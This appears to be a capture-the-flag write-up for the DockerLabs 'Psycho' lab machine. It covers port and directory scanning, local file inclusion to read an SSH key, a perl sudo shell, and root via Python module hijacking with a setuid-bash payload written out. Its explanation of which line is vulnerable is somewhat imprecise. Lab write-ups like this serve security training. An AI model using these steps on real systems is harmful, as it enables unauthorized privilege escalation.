---
layout: post
title: "DockerLabs - Psycho"
# date: 2025-06-14 10:00:00 +0700
categories: [dockerlabs]
tags: [ctf, linux, pathinjection, lfi, perl]
image: /assets/images/Psycho/doro.jpg
---
## Enumeration

### Nmap Port Scanning

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 38bb36a41860eea8d10a61976c830605 (ECDSA)
|_  256 a34e4f6f76f2ba50c61a5440959c2041 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: 4You
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

### Directory and Files Bruteforce

```bash
[Jun 14, 2025 - 20:11:59 (WIB)] exegol-dockerlabs Psycho # ffuf -c -w `fzf-wordlists` -u "http://172.17.0.2:80/FUZZ"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2:80/FUZZ
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

assets                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
```

```bash
[Jun 14, 2025 - 20:12:40 (WIB)] exegol-dockerlabs Psycho # ffuf -c -w `fzf-wordlists` -u "http://172.17.0.2:80/FUZZ"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2:80/FUZZ
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 2596, Words: 674, Lines: 63, Duration: 1ms]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.                       [Status: 200, Size: 2596, Words: 674, Lines: 63, Duration: 0ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
main.css                [Status: 200, Size: 619, Words: 90, Lines: 42, Duration: 0ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htm                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htpasswds              [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htgroup                [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
wp-forum.phps           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.bak           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htuser                 [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
```

## Initial Access

### Discover Secret Parameter

![image.png](assets/images/Psycho/image.png)

### Discover Local File Inclusion

![image.png](assets/images/Psycho/image%201.png)

### Discover vaxei id_rsa files

![image.png](assets/images/Psycho/image%203.png)
![image.png](assets/images/Psycho/image%204.png)

### Shell as Luisillo

vaxei can run perl with luisillo user lets spawn shell [https://gtfobins.github.io/gtfobins/perl/#sudo](https://gtfobins.github.io/gtfobins/perl/#sudo)
![image.png](assets/images/Psycho/image%205.png)
![image.png](assets/images/Psycho/image%206.png)

## Privilege Escalation

Luisillo can run /opt/paw.py with sudo permission
```bash
luisillo@43cb958806c4:~$ sudo -l
Matching Defaults entries for luisillo on 43cb958806c4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 43cb958806c4:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```

This file is vulnerable to path injection
```bash
import subprocess
import os
import sys
import time

# F
def dummy_function(data):
    result = ""
    for char in data:
        result += char.upper() if char.islower() else char.lower()
    return result

# Código para ejecutar el script
os.system("echo Ojo Aqui")

# Simulación de procesamiento de datos
def data_processing():
    data = "This is some dummy data that needs to be processed."
    processed_data = dummy_function(data)
    print(f"Processed data: {processed_data}")

# Simulación de un cálculo inútil
def perform_useless_calculation():
    result = 0
    for i in range(1000000):
        result += i
    print(f"Useless calculation result: {result}")

def run_command():
    subprocess.run(['echo Hello!'], check=True)

def main():
    # Llamadas a funciones que no afectan el resultado final
    data_processing()
    perform_useless_calculation()
    
    # Comando real que se ejecuta
    run_command()

if __name__ == "__main__":
    main()
```

![image.png](assets/images/Psycho/image%207.png)

This code vulnerable!
```bash
def run_command():
    subprocess.run(['echo Hello!'], check=True)
```

Add /opt to $PATH
```bash
luisillo@43cb958806c4:/opt$ export PATH=/opt:$PATH
luisillo@43cb958806c4:/opt$ echo $PATH
/opt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
luisillo@43cb958806c4:/opt$ 
```

Now we can create /opt/subprocess.py file with malicious content such:

```bash
import os
os.system("cp /bin/bash /tmp/root && chmod u+s /tmp/root")
```

![image.png](assets/images/Psycho/image%208.png)

`/tmp/root -p` for spawning a root shell

![image.png](assets/images/Psycho/image%209.png)
